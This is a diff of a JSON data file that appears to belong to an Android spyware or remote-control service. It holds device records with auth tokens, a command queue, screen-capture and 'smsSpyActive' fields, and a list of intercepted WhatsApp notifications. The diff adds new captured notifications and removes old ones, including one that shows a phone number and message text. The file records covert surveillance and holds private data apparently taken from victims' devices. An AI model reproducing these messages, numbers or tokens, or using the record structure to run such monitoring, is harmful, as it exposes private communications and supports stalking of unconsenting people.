@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777352700321,
+    "lastSeen": 1777352721374,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -466,7 +466,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777352701070,
+    "lastSeen": 1777352722079,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -482,6 +482,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Downloading 1 videos",
+        "content": "from PERGAM CRUEL STORE",
+        "time": "28/04 12:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777352723304
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Downloading 1 documents",
+        "time": "28/04 12:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777352723239
+      },
       {
         "appName": "WhatsApp",
         "sender": "Downloading 1 videos",
@@ -4465,22 +4481,6 @@
         "time": "27/04 19:53",
         "pkg": "com.whatsapp",
         "receivedAt": 1777294386164
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2 pesan dari 2 chat",
-        "time": "27/04 19:51",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294280528
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 851-8489-8250",
-        "content": "Wkwkwk",
-        "time": "27/04 19:51",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294280416
       }
     ],
     "galleryPhotos": [],
